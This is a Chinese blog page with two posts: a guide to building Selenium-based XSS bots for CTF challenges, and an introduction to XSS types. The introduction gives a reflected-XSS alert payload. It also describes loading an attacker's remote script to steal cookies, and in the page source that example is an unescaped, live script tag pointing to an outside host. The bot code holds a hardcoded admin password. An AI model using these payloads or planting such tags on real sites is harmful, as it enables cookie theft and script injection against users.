<!DOCTYPE html>



  


<html class="theme-next mist use-motion" lang="zh-Hans">
<head>
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />



  <meta name="google-site-verification" content="googleaf0347feb5ea0936.html" />














  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />






  <link rel="alternate" href="/atom.xml" title="上善若水" type="application/atom+xml" />




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2" />






<meta name="description" content="Try your best!">
<meta property="og:type" content="website">
<meta property="og:title" content="上善若水">
<meta property="og:url" content="http://yoursite.com/page/7/index.html">
<meta property="og:site_name" content="上善若水">
<meta property="og:description" content="Try your best!">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="上善若水">
<meta name="twitter:description" content="Try your best!">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Mist',
    version: '5.1.2',
    sidebar: {"position":"right","display":"post","offset":12,"offset_float":12,"b2t":true,"scrollpercent":false,"onmobile":true},
    fancybox: true,
    tabs: true,
    motion: true,
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/page/7/"/>





  <title>上善若水 - 古之立大事者，不惟有超世之才，亦必有坚韧不拔之志！</title>
  





  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?663212c5ef558c27e77385b620f14823";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script><!-- hexo-inject:begin --><!-- hexo-inject:end -->




</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="container sidebar-position-right 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">上善若水</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <h1 class="site-subtitle" itemprop="description">古之立大事者，不惟有超世之才，亦必有坚韧不拔之志！</h1>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-sitemap">
          <a href="/sitemap.xml" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
            
            站点地图
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
            
            搜索
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off"
             placeholder="搜索..." spellcheck="false"
             type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/21/xss-bot介绍/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/09/21/xss-bot介绍/" itemprop="url">xss bot介绍</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-21T17:22:02+08:00">
                2017-09-21
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web/" itemprop="url" rel="index">
                    <span itemprop="name">web</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>这篇文章摘抄与LoRexxar的的博客<a href="https://lorexxar.cn/2017/05/12/xss-bot2/" target="_blank" rel="external">https://lorexxar.cn/2017/05/12/xss-bot2/</a></p>
<p>bot是什么？原意是robot的意思，也指一个在没有人工干预下在因特网上搜索信息的程序。这里的xss bot指的是：将攻击者提供的攻击代码在服务器上模拟执行的程序。</p>
<p>因此xss bot应该具有较强的稳定性！</p>
<p>xss在近几年的ctf形式中，越来越受到了人们的重视，但是出xss的题目最重要的可能就是xss bot的问题了，一个合格的xss bot要稳定还能避免搅屎。</p>
<p>下面我们就来看看一个xss bot是怎么完成的。</p>
<h1 id="bot之前"><a href="#bot之前" class="headerlink" title="bot之前"></a>bot之前</h1><p>一般来说，对于xss bot来说，最重要的是要bot能够执行js，事情的本质是我们需要一个浏览器内核来解析js，这里我们一般会用<code>selenium+webdriver</code>。</p>
<p>而webdriver一般有3种chrome webdriver、firefox webdriver、phantomjs。</p>
<h2 id="selenium"><a href="#selenium" class="headerlink" title="selenium"></a>selenium</h2><p>selenium是用来控制webdriver的接口的，网上搜到的大部分脚本大部门都是java控制的，下面我的所有脚本都使用python操作selenium，下面有份不太完整的文档。</p>
<p><a href="http://www.seleniumhq.org/docs/03_webdriver.jsp" target="_blank" rel="external">http://www.seleniumhq.org/docs/03_webdriver.jsp</a></p>
<p>只要在python文件前引入selenium模块。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">import selenium</div><div class="line">from selenium import webdriver  </div><div class="line">from selenium.webdriver.common.keys import Keys  </div><div class="line">from selenium.common.exceptions import WebDriverException</div></pre></td></tr></table></figure>
<h2 id="chrome-webdriver"><a href="#chrome-webdriver" class="headerlink" title="chrome webdriver"></a>chrome webdriver</h2><p>如果我们想要使用chrome webdriver，除了安装chrome浏览器本身，还需要安装webdriver。</p>
<p><a href="https://sites.google.com/a/chromium.org/chromedriver/downloads" target="_blank" rel="external">https://sites.google.com/a/chromium.org/chromedriver/downloads</a></p>
<p>由于webdriver版本众多，api和语法也有所不同，这里推荐最新版chrome+最新版webdriver。</p>
<p>因为环境相异，所以我们可能需要在脚本里设置chrome webdriver的路径</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line"># -*- coding:utf-8 -*-</div><div class="line">import selenium</div><div class="line">from selenium import webdriver  </div><div class="line">from selenium.webdriver.common.keys import Keys  </div><div class="line">from selenium.common.exceptions import WebDriverException</div><div class="line">import os </div><div class="line"></div><div class="line">chromedriver = &quot;C:\Users\Administrator\AppData\Local\Google\Chrome\Application\chromedriver.exe&quot;  </div><div class="line">os.environ[&quot;webdriver.chrome.driver&quot;] = chromedriver  </div><div class="line">browser = webdriver.Chrome(chromedriver)  </div><div class="line">url = &quot;http://xxxx&quot;  	</div><div class="line">browser.get(url)</div><div class="line">browser.quit()</div></pre></td></tr></table></figure>
<h2 id="firefox-webdriver"><a href="#firefox-webdriver" class="headerlink" title="firefox webdriver"></a>firefox webdriver</h2><p>firefox和chrome相同，需要一个geckodriver来支持，和chrome类似。</p>
<p><a href="https://github.com/mozilla/geckodriver/releases/" target="_blank" rel="external">https://github.com/mozilla/geckodriver/releases/</a></p>
<p>在linux下，需要添加映射到/bin/</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chmod +x geckodriver</div></pre></td></tr></table></figure>
<p>在windows下，需要添加geckodriver到环境变量中。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line"># -*- coding:utf-8 -*-</div><div class="line">import selenium</div><div class="line">from selenium import webdriver  </div><div class="line">from selenium.webdriver.common.keys import Keys  </div><div class="line">from selenium.common.exceptions import WebDriverException</div><div class="line"></div><div class="line">browser = webdriver.Firefox()</div><div class="line"></div><div class="line">url = &quot;http://xxxx&quot;  	</div><div class="line">browser.get(url)</div><div class="line">browser.quit()</div></pre></td></tr></table></figure>
<h2 id="phantomjs"><a href="#phantomjs" class="headerlink" title="phantomjs"></a>phantomjs</h2><p>phantomjs和别的浏览器本质上没什么区别，差不多也是类似于浏览器的内核，优势其实是多平台支持，而且不需要浏览器支持，所以一般爬虫用的比较多。</p>
<p>下载地址<br><a href="http://phantomjs.org/download.html" target="_blank" rel="external">http://phantomjs.org/download.html</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line"># -*- coding:utf-8 -*-</div><div class="line">import selenium</div><div class="line">from selenium import webdriver</div><div class="line">from selenium.common.exceptions import WebDriverException</div><div class="line"></div><div class="line">phantomjs_path = &quot;sssssssss/phantomjs&quot;</div><div class="line">driver = webdriver.PhantomJS(executable_path=phantomjs_path)</div><div class="line"></div><div class="line">url = &quot;http://xxxx&quot;  	</div><div class="line">browser.get(url)</div><div class="line">browser.quit()</div></pre></td></tr></table></figure>
<h1 id="bot的背后"><a href="#bot的背后" class="headerlink" title="bot的背后"></a>bot的背后</h1><p>比起爬虫来不一样，因为一个爬虫只要打开一次获取数据就好了，但是作为xss bot必须周期性的打开页面，执行攻击者的相应payload，既然bot的持续时间一般是24小时-48小时，那bot就不可能时时刻刻都有人盯着，也就必须放在服务器上，我们来研究一下不同的webdriver在服务器的差异。</p>
<p>chrome和firefox的webdriver都有一个特点，就是需要桌面，如果执行脚本的服务器上不包含桌面，那么我就需要别的方法来构造一个虚拟的桌面。</p>
<p>如果在windows服务器上，windows服务器最大的特点就是自带桌面，我们一般通过rdp管理，所以windows服务器上跑xss bot的话不需要做专门的处理。</p>
<p>如果在linux服务器上，我们一般通过ssh管理linux服务器，那么我就需要一段神秘代码来执行xss bot脚本，这是一段火日聚聚教我的代码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">from pyvirtualdisplay import Display</div><div class="line"></div><div class="line">display = Display(visible=0, size=(800,800))</div><div class="line">display.start()</div></pre></td></tr></table></figure>
<p>在phantomjs的webdriver下，就不会有这样的问题，因为phantomjs本身就是多平台的，只是很多时候xss bot需要保证浏览器的特性，这种时候，我们往往不会使用phantomjs作为xss bot的首选。</p>
<h1 id="完成bot"><a href="#完成bot" class="headerlink" title="完成bot"></a>完成bot</h1><p>上面我们着重讲了各种webdriver，下面我就来针对不同的xss题目来谈谈。</p>
<h2 id="report-bug型xss"><a href="#report-bug型xss" class="headerlink" title="report bug型xss"></a>report bug型xss</h2><p>一般来说，xss题目最常见的就是report bug或者是留言型xss，后台接口唯一，攻击者向目标发送信息，bot需要访问页面执行js。</p>
<p>在ctf比赛中，处理方式五花八门，这里我推荐1种解决办法。</p>
<p>在攻击者页面提供测试接口和攻击接口，然后攻击者接口设置验证码，避免攻击者无意义的刷payload。（具体可以见0ctf的处理方式）</p>
<p>为了避免干扰，最好将攻击者攻击数据存入数据库，添加标志位以判断数据是否被访问过，题目专门添加功能用作check数据库内是否存在未访问数据（最好添加此功能在题目中，因为bot有可能不在题目服务器，远程数据库连接是个危险的行为！！）</p>
<p>判断存在时，bot开启webdriver访问相应的页面（通过添加cookie或者ip check的方式判断访问来源），相应的页面从数据库取出数据，bot访问完成后关闭。</p>
<p>大致流程如下：</p>
<p><img src="/images/2017-09-21/image_1bepoa4nsjb91ipsli170tclt9.png" alt="image_1bepoa4nsjb91ipsli170tclt9.png-31.8kB"></p>
<p>我这里贴上bot部分的代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> selenium</div><div class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver  </div><div class="line"><span class="keyword">from</span> selenium.webdriver.common.keys <span class="keyword">import</span> Keys  </div><div class="line"><span class="keyword">from</span> selenium.common.exceptions <span class="keyword">import</span> WebDriverException</div><div class="line"><span class="keyword">import</span> os </div><div class="line"><span class="keyword">import</span> time </div><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line"><span class="keyword">from</span> pyvirtualdisplay <span class="keyword">import</span> Display</div><div class="line"></div><div class="line">display = Display(visible=<span class="number">0</span>, size=(<span class="number">800</span>,<span class="number">800</span>))</div><div class="line">display.start()</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">	<span class="keyword">try</span>:</div><div class="line">		s = requests.Session()</div><div class="line">		url = <span class="string">'http://xxx/checksql.php'</span></div><div class="line">		r = s.get(url)</div><div class="line"></div><div class="line">		<span class="keyword">if</span> <span class="string">"存在"</span> <span class="keyword">in</span> r.text:</div><div class="line"></div><div class="line">			<span class="keyword">try</span>:</div><div class="line">				chromedriver = <span class="string">"C:\Users\Administrator\AppData\Local\Google\Chrome\Application\chromedriver.exe"</span>  </div><div class="line">				os.environ[<span class="string">"webdriver.chrome.driver"</span>] = chromedriver  </div><div class="line">				browser = webdriver.Chrome(chromedriver) </div><div class="line">				</div><div class="line">				browser.set_page_load_timeout(<span class="number">10</span>)</div><div class="line">				browser.set_script_timeout(<span class="number">10</span>)</div><div class="line"></div><div class="line"></div><div class="line">				url = <span class="string">"http://xxxxxx/admin_321321321.php"</span>  	</div><div class="line">				browser.get(url)</div><div class="line">				browser.add_cookie(&#123;<span class="string">'name'</span>: <span class="string">'admin'</span>,</div><div class="line">				 <span class="string">'value'</span> : <span class="string">'arandomstring'</span>,</div><div class="line">				 <span class="string">'path'</span> : <span class="string">'/'</span>&#125;)</div><div class="line"></div><div class="line"></div><div class="line">				browser.get(url)</div><div class="line">				<span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">					<span class="keyword">try</span>:</div><div class="line">						browser.switch_to_alert().accept()</div><div class="line">					<span class="keyword">except</span> selenium.common.exceptions.NoAlertPresentException:</div><div class="line">						<span class="keyword">break</span></div><div class="line">				<span class="keyword">print</span> browser.title</div><div class="line">				<span class="keyword">print</span> time.strftime(<span class="string">"%Y-%m-%d %X"</span>, time.localtime())</div><div class="line">				time.sleep(<span class="number">10</span>)</div><div class="line">				browser.quit()</div><div class="line">				time.sleep(<span class="number">1</span>)</div><div class="line"></div><div class="line">			<span class="keyword">except</span> Exception <span class="keyword">as</span> e: </div><div class="line">				<span class="keyword">print</span> <span class="string">"[error] "</span>+str(e)</div><div class="line">				browser.quit()</div><div class="line"></div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			<span class="keyword">print</span> time.strftime(<span class="string">"%Y-%m-%d %X"</span>, time.localtime())</div><div class="line">			<span class="keyword">print</span> <span class="string">"[info] no unread messages"</span></div><div class="line">			exit(<span class="number">0</span>)</div><div class="line"></div><div class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e: </div><div class="line">		<span class="keyword">print</span> <span class="string">"[error] "</span>+str(e)</div></pre></td></tr></table></figure>
<p>上面的代码配合crontab应该可以很好的应付这类xss的各种问题</p>
<h2 id="聊天类的交互式xss"><a href="#聊天类的交互式xss" class="headerlink" title="聊天类的交互式xss"></a>聊天类的交互式xss</h2><p>这类xss最明显的特点就是admin用户和别的用户并没有区别，也就是说bot想要打开被攻击者注入的页面，也必须经过登录，服务端设置session来登录，那么上面的办法就行不通了，最好的办法就是模拟登录。</p>
<p>这类xss最大的问题其实就是信息的隔离方式，如果聊天的交互方式本身就是显示在同一页面上的话，很显然的问题就是，如果有一个攻击者试图干扰bot的运行，他只要再每个round发送<code>&lt;xmp&gt;</code>就可以导致js无法执行，这是个我到现在还没想明白的问题。先分享现在我使用的bot</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> selenium</div><div class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver  </div><div class="line"><span class="keyword">from</span> selenium.webdriver.common.keys <span class="keyword">import</span> Keys  </div><div class="line"><span class="keyword">from</span> selenium.common.exceptions <span class="keyword">import</span> WebDriverException</div><div class="line"><span class="keyword">import</span> os </div><div class="line"><span class="keyword">import</span> time </div><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line"><span class="keyword">from</span> pyvirtualdisplay <span class="keyword">import</span> Display</div><div class="line"></div><div class="line">display = Display(visible=<span class="number">0</span>, size=(<span class="number">800</span>,<span class="number">800</span>))</div><div class="line">display.start()</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">2</span>):</div><div class="line"></div><div class="line">	<span class="keyword">try</span>:</div><div class="line">		browser = webdriver.Firefox()</div><div class="line">		browser.set_page_load_timeout(<span class="number">10</span>)</div><div class="line">		browser.set_script_timeout(<span class="number">10</span>)</div><div class="line"></div><div class="line"></div><div class="line">		url = <span class="string">"http://52.80.63.91/login.php"</span>  	</div><div class="line">		browser.get(url)</div><div class="line"></div><div class="line">		elem = browser.find_element_by_name(<span class="string">"user"</span>)</div><div class="line">		elem.clear()</div><div class="line">		elem.send_keys(<span class="string">'admin'</span>)</div><div class="line">		elem = browser.find_element_by_name(<span class="string">"pass"</span>)</div><div class="line">		elem.clear()</div><div class="line">		elem.send_keys(<span class="string">'admmin332indadmin33213'</span>)</div><div class="line">		elem = browser.find_element_by_name(<span class="string">"login"</span>)</div><div class="line">		elem.click()</div><div class="line"></div><div class="line">		<span class="keyword">print</span> <span class="string">"login success"</span></div><div class="line">	</div><div class="line">		browser.add_cookie(&#123;<span class="string">'name'</span>: <span class="string">'admin'</span>,</div><div class="line">		 <span class="string">'value'</span> : <span class="string">'arandomstring'</span>,</div><div class="line">		 <span class="string">'path'</span> : <span class="string">'/adminshigesha233e3333/'</span>&#125;)</div><div class="line"></div><div class="line">		<span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">			<span class="keyword">try</span>:</div><div class="line">				browser.switch_to_alert().accept()</div><div class="line"></div><div class="line">			<span class="keyword">except</span> selenium.common.exceptions.NoAlertPresentException:</div><div class="line">				<span class="keyword">break</span></div><div class="line"></div><div class="line">		<span class="keyword">print</span> browser.title</div><div class="line">		<span class="keyword">print</span> time.strftime(<span class="string">"%Y-%m-%d %X"</span>, time.localtime())</div><div class="line">		time.sleep(<span class="number">10</span>)</div><div class="line">		browser.quit()</div><div class="line">		time.sleep(<span class="number">1</span>)</div><div class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e: </div><div class="line">		<span class="keyword">print</span> <span class="string">"[ERROR] "</span>+str(e)</div><div class="line">		<span class="comment">#important</span></div><div class="line">		browser.quit()</div><div class="line"></div><div class="line"></div><div class="line">url2 = <span class="string">'http://xxxx/cl33e3ar5ql.php'</span></div><div class="line">r = s.get(url2)</div><div class="line"></div><div class="line"><span class="keyword">print</span> r.text</div><div class="line"><span class="keyword">print</span> time.strftime(<span class="string">"%Y-%m-%d %X"</span>, time.localtime())</div></pre></td></tr></table></figure>
<p>上面的代码通过setkey模拟登录，然后设置后台的cookie，每次payload执行2次，然后清理掉admin除预留信息以外的所有payload，避免恶意payload导致的所有payload无效。</p>
<p>配合crontab可以保证bot的持久性，如果不放心bot的稳定性，还可以在脚本执行结束后，执行命令kill掉所有的firefox残留进程。</p>
<p>到此为止，一个完整的xss bot就完成了，虽然可能不是最完美的解决方案，希望会有更好的解决办法:&gt;</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/21/xss简介/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/09/21/xss简介/" itemprop="url">xss简介</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-21T16:24:13+08:00">
                2017-09-21
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web/" itemprop="url" rel="index">
                    <span itemprop="name">web</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>自从xss被发现之后，OWASP上经常会出现它的身影。一开始xss作为一种攻击方式，应用并不算广。但是随着漏洞利用的深入钻研，安全研究者们逐渐发现xss的危害，特别是在用户授权与管理方面。</p>
<p>国内外各大web安全检测厂商，已经在其产品中加入了xss检查、过滤等功能。</p>
<h3 id="1、XSS原理"><a href="#1、XSS原理" class="headerlink" title="1、XSS原理"></a>1、XSS原理</h3><p>JavaScript可以用来获取用户的Cookie、改变网页内容、URL跳转。于是，我们就可以从存在XSS漏洞的网站中，盗取用户Cookie、黑掉页面、导航到恶意网站。</p>
<p>通常使用<script src="http://www.secbug.org/x.txt"></script>方式来加载外部脚本，而在x.txt中就存放着攻击者的恶意JavaScript代码，这段代码可能是用来盗取用户的Cookie，也可能是监控键盘记录等恶意行为。</p>
<p>备注：JavaScript加载外部的代码文件可以是任意扩展名(无扩展名也可以)</p>
<h3 id="2、XSS类型"><a href="#2、XSS类型" class="headerlink" title="2、XSS类型"></a>2、XSS类型</h3><h4 id="2-1-反射型XSS"><a href="#2-1-反射型XSS" class="headerlink" title="2.1 反射型XSS"></a>2.1 反射型XSS</h4><p>反射型XSS也被称为非持久性XSS，是现在最容易出现的一种XSS漏洞。</p>
<p>XSS的Payload一般是写在URL中，之后设法让被害者点击这个链接。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span>  </div><div class="line">     username = _GET[<span class="string">'username'</span>];  </div><div class="line">     <span class="keyword">echo</span> $username;  </div><div class="line"><span class="meta">?&gt;</span>  </div><div class="line"> </div><div class="line">利用样例：</div><div class="line">http:<span class="comment">//www.secbug.org/xss.php?username=&lt;script&gt;alert(/xss/)&lt;/script&gt;</span></div></pre></td></tr></table></figure>
<h4 id="2-2-存储型XSS"><a href="#2-2-存储型XSS" class="headerlink" title="2.2 存储型XSS"></a>2.2 存储型XSS</h4><p>存储型XSS又被称为持久性XSS，存储型XSS是最危险的一种跨站脚本。</p>
<p>存储型XSS被服务器端接收并存储，当用户访问该网页时，这段XSS代码被读出来响应给浏览器。</p>
<p>反射型XSS与DOM型XSS都必须依靠用户手动去触发，而存储型XSS却不需要。</p>
<p>测试步骤如下，以留言板为例：</p>
